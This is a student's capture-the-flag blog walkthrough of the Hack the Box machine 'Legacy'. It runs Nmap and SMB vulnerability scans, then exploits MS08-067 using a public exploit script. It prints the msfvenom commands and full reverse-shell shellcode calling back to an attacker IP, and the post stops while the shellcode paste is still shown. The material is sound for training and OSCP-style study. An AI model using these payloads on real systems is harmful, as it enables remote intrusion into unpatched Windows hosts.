<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="LogistyxCat, Blog of a security student.">

        <link rel="alternate"  href="https://logistyxcat.github.io/feeds/all.atom.xml" type="application/atom+xml" title="LogistyxCat Full Atom Feed"/>

        <title>Legacy - Hack the Box // LogistyxCat // Blog of a security student.</title>


    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.3.0/pure-min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.1.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="./theme/css/pure.css">
    <link rel="stylesheet" href="./theme/css/pygments.css">

    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/fitvids/1.0.1/jquery.fitvids.min.js"></script>
    <script>
        $(document).ready(function(){
            $(".content").fitVids();
        });
    </script>
</head>

<body>
<div class="pure-g-r" id="layout">
    <div class="sidebar sidebar-article pure-u">
        <header class="header-article">
            <hgroup>
                <a href="./author/riley.html" title="See posts by Riley">
                </a>
                <h2 class="article-info">Riley</h2>
                <small class="about-author"></small>
                <h5>Published</h5>
                <p>Thu 13 February 2020</p>
                <a href="/">&larr;Home</a>
            </hgroup>
        </header>
    </div>
    <div class="pure-u">
        <div class="content">
            <section class="post">
                <header class="post-header">
                    <h1>Legacy - Hack the Box</h1>
                        <p class="post-meta">
                            // under                                 <a class="post-category" href="./tag/ctf.html">ctf</a>
                                <a class="post-category" href="./tag/hack-the-box.html">hack the box</a>
                                <a class="post-category" href="./tag/oscp-prep.html">oscp prep</a>
                        </p>
                </header>
            </section>
            <h2>Description</h2>
<p>Legacy is a  Windows XP machine with a straight shot to system using a well-known SMB exploit.</p>
<p>Legacy is assigned IP 10.10.10.4.</p>
<h2>Reconnaissance</h2>
<p>We begin by initiating an Nmap scan.</p>
<h4>Nmap</h4>
<div class="highlight"><pre><span></span><span class="c1"># nmap -sC -sV -oA nmap/Legacy 10.10.10.4</span>

Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.4
Host is up <span class="o">(</span><span class="m">0</span>.094s latency<span class="o">)</span>.
Not shown: <span class="m">997</span> filtered ports
PORT     STATE  SERVICE       VERSION
<span class="m">139</span>/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
<span class="m">445</span>/tcp  open   microsoft-ds  Windows XP microsoft-ds
<span class="m">3389</span>/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP<span class="p">;</span> CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
<span class="p">|</span>_clock-skew: mean: -3h58m09s, deviation: 1h24m51s, median: -4h58m09s
<span class="p">|</span>_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: <span class="m">00</span>:50:56:b9:7c:12 <span class="o">(</span>VMware<span class="o">)</span>
<span class="p">|</span> smb-os-discovery: 
<span class="p">|</span>   OS: Windows XP <span class="o">(</span>Windows <span class="m">2000</span> LAN Manager<span class="o">)</span>
<span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_xp::-
<span class="p">|</span>   Computer name: legacy
<span class="p">|</span>   NetBIOS computer name: LEGACY<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>   Workgroup: HTB<span class="se">\x</span><span class="m">00</span>
<span class="p">|</span>_  System time: <span class="m">2020</span>-02-12T02:36:03+02:00
<span class="p">|</span> smb-security-mode: 
<span class="p">|</span>   account_used: &lt;blank&gt;
<span class="p">|</span>   authentication_level: user
<span class="p">|</span>   challenge_response: supported
<span class="p">|</span>_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
<span class="p">|</span>_smb2-time: Protocol negotiation failed <span class="o">(</span>SMB2<span class="o">)</span>
</pre></div>


<p>The operating system appears to be Windows XP.  XP has several known vulnerabilities, many for the SMB protocol.  To get more information, we can use the Nmap Scripting Engine (NSE) scripts.  We can locate them with the <code>locate</code> command.</p>
<div class="highlight"><pre><span></span><span class="c1"># locate .nse | head</span>
/usr/share/exploitdb/exploits/hardware/webapps/31527.nse
/usr/share/exploitdb/exploits/multiple/remote/33310.nse
/usr/share/nmap/scripts/acarsd-info.nse
/usr/share/nmap/scripts/address-info.nse
/usr/share/nmap/scripts/afp-brute.nse
/usr/share/nmap/scripts/afp-ls.nse
/usr/share/nmap/scripts/afp-path-vuln.nse
/usr/share/nmap/scripts/afp-serverinfo.nse
/usr/share/nmap/scripts/afp-showmount.nse
/usr/share/nmap/scripts/ajp-auth.nse
<span class="o">[</span>SNIP...<span class="o">]</span>
</pre></div>


<p>All the NSE scripts we need are located in the <code>/usr/share/nmap/scripts/</code> directory.  We can locate SMB vulnerability checkers by filtering the contents of the directory.</p>
<div class="highlight"><pre><span></span><span class="c1"># ls /usr/share/nmap/scripts/ | grep smb | grep vuln</span>
smb2-vuln-uptime.nse
smb-vuln-conficker.nse
smb-vuln-cve2009-3103.nse
smb-vuln-cve-2017-7494.nse
smb-vuln-ms06-025.nse
smb-vuln-ms07-029.nse
smb-vuln-ms08-067.nse
smb-vuln-ms10-054.nse
smb-vuln-ms10-061.nse
smb-vuln-ms17-010.nse
smb-vuln-regsvc-dos.nse
smb-vuln-webexec.nse
</pre></div>


<p>Perfect!  To use a script with nmap, we need to set the <code>--script</code> flag, like below.  It can accept wildcards as input, which is extremely useful for identifying all of the above scripts.</p>
<div class="highlight"><pre><span></span><span class="c1"># nmap -p 139 -sV --script=smb-vuln* 10.10.10.4</span>

Nmap scan report <span class="k">for</span> <span class="m">10</span>.10.10.4
Host is up <span class="o">(</span><span class="m">0</span>.085s latency<span class="o">)</span>.

PORT    STATE SERVICE     VERSION
<span class="m">139</span>/tcp open  netbios-ssn Microsoft Windows netbios-ssn
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span> smb-vuln-ms08-067: 
<span class="p">|</span>   VULNERABLE:
<span class="p">|</span>   Microsoft Windows system vulnerable to remote code execution <span class="o">(</span>MS08-067<span class="o">)</span>
<span class="p">|</span>     State: VULNERABLE
<span class="p">|</span>     IDs:  CVE:CVE-2008-4250
<span class="p">|</span>           The Server service in Microsoft Windows <span class="m">2000</span> SP4, XP SP2 and SP3, Server <span class="m">2003</span> SP1 and SP2,
<span class="p">|</span>           Vista Gold and SP1, Server <span class="m">2008</span>, and <span class="m">7</span> Pre-Beta allows remote attackers to execute arbitrary
<span class="p">|</span>           code via a crafted RPC request that triggers the overflow during path canonicalization.
<span class="p">|</span>           
<span class="p">|</span>     Disclosure date: <span class="m">2008</span>-10-23
<span class="p">|</span>     References:
<span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
<span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2008-4250
<span class="p">|</span>_smb-vuln-ms10-054: <span class="nb">false</span>
<span class="p">|</span>_smb-vuln-ms10-061: ERROR: Script execution failed <span class="o">(</span>use -d to debug<span class="o">)</span>
<span class="p">|</span> smb-vuln-ms17-010: 
<span class="p">|</span>   VULNERABLE:
<span class="p">|</span>   Remote Code Execution vulnerability in Microsoft SMBv1 servers <span class="o">(</span>ms17-010<span class="o">)</span>
<span class="p">|</span>     State: VULNERABLE
<span class="p">|</span>     IDs:  CVE:CVE-2017-0143
<span class="p">|</span>     Risk factor: HIGH
<span class="p">|</span>       A critical remote code execution vulnerability exists in Microsoft SMBv1
<span class="p">|</span>        servers <span class="o">(</span>ms17-010<span class="o">)</span>.
<span class="p">|</span>           
<span class="p">|</span>     Disclosure date: <span class="m">2017</span>-03-14
<span class="p">|</span>     References:
<span class="p">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2017-0143
<span class="p">|</span>       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
<span class="p">|</span>_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
</pre></div>


<p>The box appears to be vulnerable to both <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">ms08-067</a> and <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">ms17-010</a>.  These are both worth investigating, but this post will cover ms08-067.</p>
<h2>Getting System with ms08-067</h2>
<p>Some browsing reveals a nice <a href="https://github.com/andyacer/ms08_067">Github repo</a> for ms08-067 hosted by Github user <em>andyacer</em>.  The README states that we need Impacket 0_9_17, and helpfully provides the instructions on installing it:</p>
<div class="highlight"><pre><span></span>git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
<span class="nb">cd</span> impacket
pip install .
</pre></div>


<p>Then we can clone the exploit repository.</p>
<div class="highlight"><pre><span></span><span class="c1"># git clone https://github.com/andyacer/ms08_067</span>
Cloning into <span class="s1">&#39;ms08_067&#39;</span>...
remote: Enumerating objects: <span class="m">37</span>, <span class="k">done</span>.
remote: Total <span class="m">37</span> <span class="o">(</span>delta <span class="m">0</span><span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta <span class="m">0</span><span class="o">)</span>, pack-reused <span class="m">37</span>
Unpacking objects: <span class="m">100</span>% <span class="o">(</span><span class="m">37</span>/37<span class="o">)</span>, <span class="m">13</span>.00 KiB <span class="p">|</span> <span class="m">2</span>.60 MiB/s, <span class="k">done</span>.
<span class="c1"># cd ms08_067/</span>
/ms08_067# ls
LICENSE  ms08_067_2018.py  README.md
</pre></div>


<p>Based on the source code, we will need to generate our own shellcode that the exploit will execute.  The script provides some sample commands for <code>msfvenom</code>.</p>
<h4>ms08-067.py shellcode section</h4>
<div class="highlight"><pre><span></span><span class="c1"># ------------------------------------------------------------------------</span>
<span class="c1"># REPLACE THIS SHELLCODE with shellcode generated for your use</span>
<span class="c1"># Note that length checking logic follows this section, so there&#39;s no need to count bytes or bother with NOPS.</span>
<span class="c1">#</span>
<span class="c1"># Example msfvenom commands to generate shellcode:</span>
<span class="c1"># msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows</span>
<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows</span>
<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows</span>

<span class="c1"># Reverse TCP to 10.11.0.157 port 62000:</span>
<span class="n">shellcode</span><span class="o">=</span><span class="p">(</span>
<span class="s2">&quot;</span><span class="se">\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x42\xf6\xc3\xef\x83\xee\xfc\xe2\xf4\xbe\x1e\x41\xef\x42\xf6</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa3\x66\xa7\xc7\x03\x8b\xc9\xa6\xf3\x64\x10\xfa\x48\xbd\x56</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x7d\xb1\xc7\x4d\x41\x89\xc9\x73\x09\x6f\xd3\x23\x8a\xc1\xc3</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x62\x37\x0c\xe2\x43\x31\x21\x1d\x10\xa1\x48\xbd\x52\x7d\x89</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd3\xc9\xba\xd2\x97\xa1\xbe\xc2\x3e\x13\x7d\x9a\xcf\x43\x25</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x48\xa6\x5a\x15\xf9\xa6\xc9\xc2\x48\xee\x94\xc7\x3c\x43\x83</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x39\xce\xee\x85\xce\x23\x9a\xb4\xf5\xbe\x17\x79\x8b\xe7\x9a</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa6\xae\x48\xb7\x66\xf7\x10\x89\xc9\xfa\x88\x64\x1a\xea\xc2</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x3c\xc9\xf2\x48\xee\x92\x7f\x87\xcb\x66\xad\x98\x8e\x1b\xac</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x92\x10\xa2\xa9\x9c\xb5\xc9\xe4\x28\x62\x1f\x9e\xf0\xdd\x42</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xf6\xab\x98\x31\xc4\x9c\xbb\x2a\xba\xb4\xc9\x45\x09\x16\x57</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xd2\xf7\xc3\xef\x6b\x32\x97\xbf\x2a\xdf\x43\x84\x42\x09\x16</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xbf\x12\xa6\x93\xaf\x12\xb6\x93\x87\xa8\xf9\x1c\x0f\xbd\x23</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x54\x85\x47\x9e\xc9\xe4\x42\x6b\xab\xed\x42\x04\xf3\x66\xa4</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x9c\xd3\xb9\x15\x9e\x5a\x4a\x36\x97\x3c\x3a\xc7\x36\xb7\xe3</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xbd\xb8\xcb\x9a\xae\x9e\x33\x5a\xe0\xa0\x3c\x3a\x2a\x95\xae</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x8b\x42\x7f\x20\xb8\x15\xa1\xf2\x19\x28\xe4\x9a\xb9\xa0\x0b</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa5\x28\x06\xd2\xff\xee\x43\x7b\x87\xcb\x52\x30\xc3\xab\x16</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa6\x95\xb9\x14\xb0\x95\xa1\x14\xa0\x90\xb9\x2a\x8f\x0f\xd0</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc4\x09\x16\x66\xa2\xb8\x95\xa9\xbd\xc6\xab\xe7\xc5\xeb\xa3</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x10\x97\x4d\x23\xf2\x68\xfc\xab\x49\xd7\x4b\x5e\x10\x97\xca</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xc5\x93\x48\x76\x38\x0f\x37\xf3\x78\xa8\x51\x84\xac\x85\x42</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\xa5\x3c\x3a</span><span class="s2">&quot;</span>
<span class="p">)</span>
<span class="c1"># ------------------------------------------------------------------------</span>
</pre></div>


<h4>Generating shellcode</h4>
<p>We can generate our own shellcode using msfvenom.  Here is the command I used and an explanation of the switches I enabled:</p>
<div class="highlight"><pre><span></span>msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="m">10</span>.10.14.33 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4433</span> <span class="nv">EXITFUNC</span><span class="o">=</span>thread -b <span class="s2">&quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot;</span> -f python -a x86 --platform windows -v shellcode
</pre></div>


<ul>
<li><code>-p windows/shell_reverse_tcp</code>   Creates a reverse TCP stream from a Windows host.</li>
<li><code>LHOST=10.10.14.33</code>  Sets the IP for the reverse shell to connect to; this is almost always an attacker-controlled machine.</li>
<li><code>LPORT=4433</code> Sets the port that the reverse shell attempts to connect to.</li>
<li><code>EXITFUNC=thread</code>    Ensures that the exploit won't quit out after the shellcode executes.</li>
<li><code>-b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"</code>  Sets the bad characters; msfvenom will avoid using these in the shellcode. Null bytes '\x00' are a common setting.</li>
<li><code>-f python</code>  Output format, set to Python since the script is in Python. The default is C, but either can work with a little editing.</li>
<li><code>-a x86</code> The architecture of the target, most likely x86, 32 bit.</li>
<li><code>--platform windows</code> Sets the target platform, in this case Windows. Msfvenom is smart enough to infer the target platform without this setting based on the module reverse shell we selected earlier, but explicit settings can't hurt.</li>
<li><code>-v shellcode</code>   Changes the name of the shellcode variable from <code>buf</code> to <code>shellcode</code>, which is the one used in the exploit.</li>
</ul>
<p>Which outputs this shellcode:</p>
<div class="highlight"><pre><span></span><span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
<span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="k">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
<span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">failed</span> <span class="k">with</span> <span class="n">A</span> <span class="n">valid</span> <span class="n">opcode</span> <span class="n">permutation</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">found</span><span class="o">.</span>
<span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="k">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">generic</span><span class="o">/</span><span class="n">none</span>
<span class="n">generic</span><span class="o">/</span><span class="n">none</span> <span class="n">failed</span> <span class="k">with</span> <span class="n">Encoding</span> <span class="n">failed</span> <span class="n">due</span> <span class="n">to</span> <span class="n">a</span> <span class="n">bad</span> <span class="n">character</span> <span class="p">(</span><span class="n">index</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span> <span class="n">char</span><span class="o">=</span><span class="mh">0x00</span><span class="p">)</span>
<span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="k">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">call4_dword_xor</span>
<span class="n">x86</span><span class="o">/</span><span class="n">call4_dword_xor</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">348</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
<span class="n">x86</span><span class="o">/</span><span class="n">call4_dword_xor</span> <span class="n">chosen</span> <span class="k">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">348</span>
<span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">348</span> <span class="nb">bytes</span>
<span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">python</span> <span class="n">file</span><span class="p">:</span> <span class="mi">1953</span> <span class="nb">bytes</span>
<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xb7\xe2\xd5\x8e\xca\xe3\xdf\x10\x73\xe6</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd1\xb5\x18\xab\x65\x62\xce\xd1\xbd\xdd\x93</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xb9\xe6\x98\xe0\x8b\xd1\xbb\xfb\xf5\xf9\xc9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x94\x46\x5b\x57\x03\xb8\x8e\xef\xba\x7d\xda</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xbf\xfb\x90\x0e\x84\x93\x46\x5b\xbf\xc3\xe9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xde\xaf\xc3\xf9\xde\x87\x79\xb6\x51\x0f\x6c</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x19\x85\x96\xd1\x84\xe5\x9d\x98\xe6\xed</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x93\xa8\xdf\x66\x75\xd3\x9e\xb9\xc4\xd1\x17</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4a\xe7\xd8\x71\x3a\x16\x79\xfa\xe3\x6c\xf7</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x86\x9a\x7f\xd1\x7e\x5a\x31\xef\x71\x3a\xfb</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xda\xe3\x8b\x93\x30\x6d\xb8\xc4\xee\xbf\x19</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf9\xab\xd7\xb9\x71\x44\xe8\x28\xd7\x9d\xb2</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xee\x92\x34\xca\xcb\x83\x7f\x8e\xab\xc7\xe9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd8\xb9\xc5\xff\xd8\xa1\xc5\xef\xdd\xb9\xfb</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xc0\x42\xd0\x15\x46\x5b\x66\x73\xf7\xd8\xa9</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x89\xe6\xe7\x14\xa4\xee\x10\x46\x02\x6e</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf2\xb9\xb3\xe6\x49\x06\x04\x13\x10\x46\x85</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x88\x93\x99\x39\x75\x0f\xe6\xbc\x35\xa8\x80</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xe1\x85\x93\xea\x71\x3a</span><span class="s2">&quot;</span>
</pre></div>


<p>After pasting, the finished result should have your shellcode in place of the original, like so:</p>
<div class="highlight"><pre><span></span><span class="c1">#------------------------------------------------------------------------                                                                      </span>
<span class="c1"># REPLACE THIS SHELLCODE with shellcode generated for your use</span>
<span class="p">[</span><span class="n">SNIP</span><span class="p">]</span>


<span class="c1"># Reverse TCP to 10.10.14.33 on port 4433:</span>
<span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.33 LPORT=4433 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f python -a x86 --platform windows -v shellcode</span>

<span class="n">shellcode</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5e\x81\x76\x0e\x93\xb9\x8e\xef\x83\xee\xfc</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe2\xf4\x6f\x51\x0c\xef\x93\xb9\xee\x66\x76</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x88\x4e\x8b\x18\xe9\xbe\x64\xc1\xb5\x05\xbd</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x87\x32\xfc\xc7\x9c\x0e\xc4\xc9\xa2\x46\x22</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xd3\xf2\xc5\x8c\xc3\xb3\x78\x41\xe2\x92\x7e</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6c\x1d\xc1\xee\x05\xbd\x83\x32\xc4\xd3\x18</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xf5\x9f\x97\x70\xf1\x8f\x3e\xc2\x32\xd7\xcf</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x92\x6a\x05\xa6\x8b\x5a\xb4\xa6\x18\x8d\x05</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xee\x45\x88\x71\x43\x52\x76\x83\xee\x54\x81</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x6e\x9a\x65\xba\xf3\x17\xa8\xc4\xaa\x9a\x77</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xe1\x05\xb7\xb7\xb8\x5d\x89\x18\xb5\xc5\x64</span><span class="s2">&quot;</span>
<span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xcb\xa5\x8f\x3c\x18\xbd\x05\xee\x43\x30\xca</span><span class="s2">&quot;</span>
